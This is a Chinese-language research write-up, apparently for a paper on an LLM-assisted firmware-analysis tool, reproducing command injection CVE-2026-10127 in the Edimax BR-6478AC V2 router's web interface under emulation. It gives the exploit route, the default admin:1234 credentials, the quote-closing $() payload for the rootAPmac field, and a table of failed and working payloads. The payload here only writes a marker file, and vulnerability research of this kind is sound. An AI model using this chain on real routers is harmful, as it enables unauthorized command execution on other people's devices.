# Edimax BR-6478AC V2 1.23：命令执行完整链路（2026-11-25）

> 结果：**命令执行确认**。证据文件 `/tmp/FWMAP_RCE_PROOF` 内容为 `FWMAP-CONFIRMED`。
> 归属：对应 **CVE-2026-10127**（同一型号、同一路由、同一参数）——这是**复现**，
> 但"怎么打进去"（单引号闭合 + `$()`）是我们自己从 M3 的 guard 数据推出来的，
> 之前那套分号注入在真机上根本不通。

## 一、完整链路（每一步都有工具产物支撑）

```
① 路由    /goform/formStaDrvSetup        ← pages.scan 从固件网页抽出来
② 参数    18 个字段（rootAPmac 等）        ← extract_form_params
③ 认证    Basic admin:1234                ← tools_auth.probe_basic 打出来的
④ 载荷    00:11:22:33:44:55'$(cmd)'       ← 从 M3 的 guard 推出来（关键）
⑤ 证据    /tmp/FWMAP_RCE_PROOF = "FWMAP-CONFIRMED"
```

## 二、关键突破：分号会被截断

M3 给出的 guard 片段：

```
while (*pcVar14 != ';') { ... }
*pcVar14 = '\0'
puVar10 = "echo '%s' > /tmp/apcli0_rootMAC"
sprintf(...)
```

三件事一句话说清：

1. 处理器把 `rootAPmac` 塞进 `echo '%s' > /tmp/...`；
2. 它会在 **`;` 处截断** —— 所以 `MAC;cmd` 这类经典注入**全部失效**；
3. 但 `%s` 在**单引号内**，只要闭合单引号，后面就能用 `$()` 或反引号执行。

于是载荷：

```
00:11:22:33:44:55'$(echo FWMAP-CONFIRMED>/tmp/FWMAP_RCE_PROOF)'
```

拼出来的命令是：

```sh
echo '00:11:22:33:44:55'$(echo FWMAP-CONFIRMED>/tmp/FWMAP_RCE_PROOF)'' > /tmp/apcli0_rootMAC
```

`$()` 先执行写文件，外层 `echo` 照常输出 —— **不触发任何错误页**，服务端返回 1523 B 的正常页面。

## 三、复现记录

| 项目 | 值 |
|---|---|
| 目标 | Edimax BR-6478AC V2 **1.23**（`BR6478ACV2_v1.23.bin`） |
| 服务 | `bin/webs`（Boa 0.94.14rc21），chroot + qemu-mipsel |
| 认证 | `Authorization: Basic YWRtaW46MTIzNA==`（admin:1234） |
| 请求 | `POST /goform/formStaDrvSetup`，18 个表单字段 |
| 载荷 | `00:11:22:33:44:55'$(echo FWMAP-CONFIRMED>/tmp/FWMAP_RCE_PROOF)'` |
| 响应 | 1523 B，HTTP 200（**正常页面，无报错**） |
| 证据 | `/tmp/FWMAP_RCE_PROOF` → `FWMAP-CONFIRMED` |

失败的对照组（同一请求，只换载荷）：

| 载荷 | 结果 |
|---|---|
| `MAC;touch /tmp/x;` | 无执行（分号被截断） |
| ``MAC`touch /tmp/x` `` | 无执行（在单引号内，反引号不展开） |
| `MAC'$(touch /tmp/x)'` | **执行** ✅ |

## 四、这条链路为什么值得写进论文

1. **每一环都是工具产出**：路由来自 `pages.scan`，参数来自 `extract_form_params`，
   认证来自 `tools_auth.probe_basic`，载荷依据来自 M3 的 guard 文本。
2. **"打得中"与"打得穿"是两件事**：参数抽全只解决"打得中"（响应从 184B 变成 1523B），
   "打得穿"还需要读懂处理器怎么拼命令——这正是我们要 LLM 去读的东西。
3. **失败对照说明复现不是碰运气**：三种载荷里只有闭合引号那种成立。

## 五、诚实标注

- 该漏洞**已被公开**（CVE-2026-10127），本文是**复现**，不主张新发现；
- 我们的增量是**可用性分析**：为什么分号注入不行、怎么用单引号闭合绕过截断；
- 真机上是否同样触发，取决于该字段是否同样进入 `echo '%s'` —— 静态证据支持，未在真机验证。
